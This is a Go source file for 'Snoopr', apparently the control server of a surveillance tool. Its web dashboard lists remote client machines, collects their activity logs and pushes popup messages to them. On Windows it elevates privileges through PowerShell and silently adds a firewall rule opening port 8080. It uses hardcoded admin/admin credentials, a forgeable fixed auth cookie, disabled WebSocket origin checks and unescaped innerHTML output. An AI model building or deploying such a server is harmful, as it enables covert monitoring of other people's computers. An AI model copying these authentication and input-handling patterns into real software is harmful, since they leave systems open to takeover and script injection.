package main

import (
	"encoding/json"
	"fmt"
	"log"
	"net/http"
	"os/exec"
	"runtime"
	"sync"
	"time"

	"github.com/gorilla/mux"
	"github.com/gorilla/websocket"
)

type Server struct {
	clients    map[string]*Client
	clientsMux sync.RWMutex
	upgrader   websocket.Upgrader
	username   string
	password   string
}

type Client struct {
	ID       string    `json:"id"`
	IP       string    `json:"ip"`
	Hostname string    `json:"hostname"`
	OS       string    `json:"os"`
	LastSeen time.Time `json:"lastSeen"`
	Conn     *websocket.Conn
}

type Message struct {
	Type string      `json:"type"`
	From string      `json:"from"`
	To   string      `json:"to"`
	Data interface{} `json:"data"`
	Time time.Time   `json:"time"`
}

type ActivityLog struct {
	ClientID  string    `json:"clientId"`
	Type      string    `json:"type"`
	Data      string    `json:"data"`
	Timestamp time.Time `json:"timestamp"`
}

var server *Server
var activityLogs []ActivityLog
var logsMux sync.RWMutex

func main() {
	server = &Server{
		clients:  make(map[string]*Client),
		username: "admin",
		password: "admin",
		upgrader: websocket.Upgrader{
			CheckOrigin: func(r *http.Request) bool {
				return true
			},
		},
	}

	// Elevate privileges and open firewall port on Windows
	if runtime.GOOS == "windows" {
		elevatePrivileges()
		openFirewallPort()
	}

	r := mux.NewRouter()

	// Authentication middleware
	authMiddleware := func(next http.HandlerFunc) http.HandlerFunc {
		return func(w http.ResponseWriter, r *http.Request) {
			if r.URL.Path == "/login" || r.URL.Path == "/auth" {
				next(w, r)
				return
			}

			cookie, err := r.Cookie("auth")
			if err != nil || cookie.Value != "authenticated" {
				http.Redirect(w, r, "/login", http.StatusFound)
				return
			}
			next(w, r)
		}
	}

	// Static files and routes
	r.PathPrefix("/static/").Handler(http.StripPrefix("/static/", http.FileServer(http.Dir("./web/static/"))))
	r.HandleFunc("/login", loginHandler)
	r.HandleFunc("/auth", authHandler)
	r.HandleFunc("/", authMiddleware(dashboardHandler))
	r.HandleFunc("/api/clients", authMiddleware(clientsHandler))
	r.HandleFunc("/api/logs", authMiddleware(logsHandler))
	r.HandleFunc("/api/message", authMiddleware(messageHandler))
	r.HandleFunc("/api/settings", authMiddleware(settingsHandler))
	r.HandleFunc("/ws/client", clientWebSocketHandler)
	r.HandleFunc("/ws/dashboard", authMiddleware(dashboardWebSocketHandler))

	fmt.Println("Snoopr Server starting on :8080")
	fmt.Println("Dashboard: http://localhost:8080")
	fmt.Printf("Credentials: %s / %s\n", server.username, server.password)

	log.Fatal(http.ListenAndServe("0.0.0.0:8080", r))
}

func elevatePrivileges() {
	cmd := exec.Command("powershell", "-Command", "Start-Process", "cmd", "-Verb", "runAs")
	cmd.Run()
}

func openFirewallPort() {
	cmd := exec.Command("netsh", "advfirewall", "firewall", "add", "rule",
		"name=Snoopr Server", "dir=in", "action=allow", "protocol=TCP", "localport=8080")
	cmd.Run()
}

func loginHandler(w http.ResponseWriter, r *http.Request) {
	tmpl := `
<!DOCTYPE html>
<html>
<head>
    <title>Snoopr - Login</title>
    <style>
        body { font-family: Arial, sans-serif; background: #1e1e1e; color: #fff; margin: 0; padding: 0; }
        .login-container { display: flex; justify-content: center; align-items: center; height: 100vh; }
        .login-form { background: #2d2d2d; padding: 2rem; border-radius: 8px; box-shadow: 0 4px 6px rgba(0,0,0,0.3); }
        .login-form h2 { text-align: center; color: #ff6b6b; margin-bottom: 1.5rem; }
        .form-group { margin-bottom: 1rem; }
        .form-group label { display: block; margin-bottom: 0.5rem; }
        .form-group input { width: 100%; padding: 0.75rem; border: 1px solid #444; background: #333; color: #fff; border-radius: 4px; }
        .btn { background: #ff6b6b; color: white; padding: 0.75rem 1.5rem; border: none; border-radius: 4px; cursor: pointer; width: 100%; }
        .btn:hover { background: #ff5252; }
        .error { color: #ff6b6b; text-align: center; margin-top: 1rem; }
    </style>
</head>
<body>
    <div class="login-container">
        <div class="login-form">
            <h2>🕵️ Snoopr Dashboard</h2>
            <form method="POST" action="/auth">
                <div class="form-group">
                    <label for="username">Username:</label>
                    <input type="text" id="username" name="username" required>
                </div>
                <div class="form-group">
                    <label for="password">Password:</label>
                    <input type="password" id="password" name="password" required>
                </div>
                <button type="submit" class="btn">Login</button>
            </form>
        </div>
    </div>
</body>
</html>`

	w.Header().Set("Content-Type", "text/html")
	w.Write([]byte(tmpl))
}

func authHandler(w http.ResponseWriter, r *http.Request) {
	username := r.FormValue("username")
	password := r.FormValue("password")

	if username == server.username && password == server.password {
		http.SetCookie(w, &http.Cookie{
			Name:  "auth",
			Value: "authenticated",
			Path:  "/",
		})
		http.Redirect(w, r, "/", http.StatusFound)
	} else {
		http.Redirect(w, r, "/login", http.StatusFound)
	}
}

func dashboardHandler(w http.ResponseWriter, r *http.Request) {
	tmpl := `
<!DOCTYPE html>
<html>
<head>
    <title>Snoopr Dashboard</title>
    <style>
        body { font-family: Arial, sans-serif; background: #1e1e1e; color: #fff; margin: 0; padding: 0; }
        .header { background: #2d2d2d; padding: 1rem; border-bottom: 2px solid #ff6b6b; }
        .header h1 { margin: 0; color: #ff6b6b; display: inline-block; }
        .logout { float: right; background: #666; color: white; padding: 0.5rem 1rem; text-decoration: none; border-radius: 4px; }
        .container { display: flex; height: calc(100vh - 80px); }
        .sidebar { width: 300px; background: #2d2d2d; padding: 1rem; overflow-y: auto; }
        .main-content { flex: 1; padding: 1rem; overflow-y: auto; }
        .client-list { margin-bottom: 2rem; }
        .client-item { background: #333; margin: 0.5rem 0; padding: 1rem; border-radius: 4px; cursor: pointer; }
        .client-item:hover { background: #444; }
        .client-item.active { border-left: 4px solid #ff6b6b; }
        .controls { background: #2d2d2d; padding: 1rem; margin-bottom: 1rem; border-radius: 4px; }
        .btn { background: #ff6b6b; color: white; padding: 0.5rem 1rem; border: none; border-radius: 4px; cursor: pointer; margin: 0.25rem; }
        .btn:hover { background: #ff5252; }
        .btn.danger { background: #f44336; }
        .btn.success { background: #4caf50; }
        .logs { background: #2d2d2d; padding: 1rem; border-radius: 4px; height: 400px; overflow-y: auto; }
        .log-entry { padding: 0.5rem; border-bottom: 1px solid #444; font-size: 0.9rem; }
        .message-input { width: 70%; padding: 0.5rem; background: #333; border: 1px solid #666; color: #fff; border-radius: 4px; }
        .status { padding: 0.25rem 0.5rem; border-radius: 4px; font-size: 0.8rem; }
        .status.online { background: #4caf50; }
        .status.offline { background: #f44336; }
    </style>
</head>
<body>
    <div class="header">
        <h1>🕵️ Snoopr Dashboard</h1>
        <a href="/login" class="logout">Logout</a>
    </div>
    <div class="container">
        <div class="sidebar">
            <h3>Connected Clients</h3>
            <div id="clients" class="client-list">
                <!-- Clients will be populated here -->
            </div>
            <div class="controls">
                <h4>Controls</h4>
                <button class="btn" onclick="sendMessage()">Send Message</button>
                <button class="btn success" onclick="startLogging()">Start Logging</button>
                <button class="btn danger" onclick="stopLogging()">Stop Logging</button>
                <br><br>
                <input type="text" id="messageInput" class="message-input" placeholder="Type message to send to client...">
                <br><br>
                <button class="btn" onclick="refreshClients()">Refresh Clients</button>
            </div>
        </div>
        <div class="main-content">
            <h3>Activity Logs</h3>
            <div id="logs" class="logs">
                <!-- Logs will be populated here -->
            </div>
        </div>
    </div>

    <script>
        let selectedClient = null;
        let ws = null;

        function connectWebSocket() {
            ws = new WebSocket('ws://localhost:8080/ws/dashboard');
            ws.onmessage = function(event) {
                const message = JSON.parse(event.data);
                handleWebSocketMessage(message);
            };
            ws.onclose = function() {
                setTimeout(connectWebSocket, 3000);
            };
        }

        function handleWebSocketMessage(message) {
            if (message.type === 'client_update') {
                refreshClients();
            } else if (message.type === 'activity_log') {
                addLogEntry(message.data);
            }
        }

        function refreshClients() {
            fetch('/api/clients')
                .then(response => response.json())
                .then(clients => {
                    const clientsDiv = document.getElementById('clients');
                    clientsDiv.innerHTML = '';
                    clients.forEach(client => {
                        const div = document.createElement('div');
                        div.className = 'client-item';
                        div.onclick = () => selectClient(client.id);
                        div.innerHTML = '<strong>' + client.hostname + '</strong><br>' +
                                       '<small>' + client.ip + '</small><br>' +
                                       '<span class="status online">Online</span>';
                        clientsDiv.appendChild(div);
                    });
                });
        }

        function selectClient(clientId) {
            selectedClient = clientId;
            document.querySelectorAll('.client-item').forEach(item => {
                item.classList.remove('active');
            });
            event.target.classList.add('active');
        }

        function sendMessage() {
            const message = document.getElementById('messageInput').value;
            if (!message || !selectedClient) {
                alert('Please select a client and enter a message');
                return;
            }
            
            fetch('/api/message', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({clientId: selectedClient, message: message})
            });
            
            document.getElementById('messageInput').value = '';
        }

        function startLogging() {
            if (!selectedClient) {
                alert('Please select a client');
                return;
            }
            // Send start logging command
        }

        function stopLogging() {
            if (!selectedClient) {
                alert('Please select a client');
                return;
            }
            // Send stop logging command
        }

        function loadLogs() {
            fetch('/api/logs')
                .then(response => response.json())
                .then(logs => {
                    const logsDiv = document.getElementById('logs');
                    logsDiv.innerHTML = '';
                    logs.forEach(log => {
                        addLogEntry(log);
                    });
                });
        }

        function addLogEntry(log) {
            const logsDiv = document.getElementById('logs');
            const div = document.createElement('div');
            div.className = 'log-entry';
            div.innerHTML = '<strong>[' + new Date(log.timestamp).toLocaleString() + ']</strong> ' +
                           '<em>' + log.clientId + '</em>: ' + log.type + ' - ' + log.data;
            logsDiv.appendChild(div);
            logsDiv.scrollTop = logsDiv.scrollHeight;
        }

        // Initialize
        connectWebSocket();
        refreshClients();
        loadLogs();
        setInterval(refreshClients, 5000);
        setInterval(loadLogs, 2000);
    </script>
</body>
</html>`

	w.Header().Set("Content-Type", "text/html")
	w.Write([]byte(tmpl))
}

func clientsHandler(w http.ResponseWriter, r *http.Request) {
	server.clientsMux.RLock()
	clients := make([]*Client, 0, len(server.clients))
	for _, client := range server.clients {
		clients = append(clients, client)
	}
	server.clientsMux.RUnlock()

	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(clients)
}

func logsHandler(w http.ResponseWriter, r *http.Request) {
	logsMux.RLock()
	defer logsMux.RUnlock()

	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(activityLogs)
}

func messageHandler(w http.ResponseWriter, r *http.Request) {
	if r.Method != "POST" {
		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
		return
	}

	var req struct {
		ClientID string `json:"clientId"`
		Message  string `json:"message"`
	}

	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		http.Error(w, "Invalid JSON", http.StatusBadRequest)
		return
	}

	server.clientsMux.RLock()
	client, exists := server.clients[req.ClientID]
	server.clientsMux.RUnlock()

	if !exists {
		http.Error(w, "Client not found", http.StatusNotFound)
		return
	}

	msg := Message{
		Type: "popup_message",
		Data: req.Message,
		Time: time.Now(),
	}

	client.Conn.WriteJSON(msg)

	// Log the message
	logsMux.Lock()
	activityLogs = append(activityLogs, ActivityLog{
		ClientID:  req.ClientID,
		Type:      "message_sent",
		Data:      req.Message,
		Timestamp: time.Now(),
	})
	logsMux.Unlock()

	w.WriteHeader(http.StatusOK)
}

func settingsHandler(w http.ResponseWriter, r *http.Request) {
	if r.Method == "POST" {
		var settings struct {
			Username string `json:"username"`
			Password string `json:"password"`
		}

		if err := json.NewDecoder(r.Body).Decode(&settings); err != nil {
			http.Error(w, "Invalid JSON", http.StatusBadRequest)
			return
		}

		server.username = settings.Username
		server.password = settings.Password

		w.WriteHeader(http.StatusOK)
	}
}

func clientWebSocketHandler(w http.ResponseWriter, r *http.Request) {
	conn, err := server.upgrader.Upgrade(w, r, nil)
	if err != nil {
		log.Printf("WebSocket upgrade error: %v", err)
		return
	}
	defer conn.Close()

	// Client registration
	var regMsg Message
	if err := conn.ReadJSON(&regMsg); err != nil {
		log.Printf("Client registration error: %v", err)
		return
	}

	clientData := regMsg.Data.(map[string]interface{})
	client := &Client{
		ID:       fmt.Sprintf("client_%d", time.Now().Unix()),
		IP:       r.RemoteAddr,
		Hostname: clientData["hostname"].(string),
		OS:       clientData["os"].(string),
		LastSeen: time.Now(),
		Conn:     conn,
	}

	server.clientsMux.Lock()
	server.clients[client.ID] = client
	server.clientsMux.Unlock()

	log.Printf("Client connected: %s (%s)", client.Hostname, client.IP)

	// Handle client messages
	for {
		var msg Message
		if err := conn.ReadJSON(&msg); err != nil {
			log.Printf("Client message error: %v", err)
			break
		}

		client.LastSeen = time.Now()

		// Log activity
		logsMux.Lock()
		activityLogs = append(activityLogs, ActivityLog{
			ClientID:  client.ID,
			Type:      msg.Type,
			Data:      fmt.Sprintf("%v", msg.Data),
			Timestamp: time.Now(),
		})
		logsMux.Unlock()
	}

	// Cleanup
	server.clientsMux.Lock()
	delete(server.clients, client.ID)
	server.clientsMux.Unlock()

	log.Printf("Client disconnected: %s", client.Hostname)
}

func dashboardWebSocketHandler(w http.ResponseWriter, r *http.Request) {
	conn, err := server.upgrader.Upgrade(w, r, nil)
	if err != nil {
		log.Printf("Dashboard WebSocket upgrade error: %v", err)
		return
	}
	defer conn.Close()

	// Keep connection alive and send updates
	for {
		time.Sleep(5 * time.Second)

		msg := Message{
			Type: "ping",
			Time: time.Now(),
		}

		if err := conn.WriteJSON(msg); err != nil {
			break
		}
	}
}
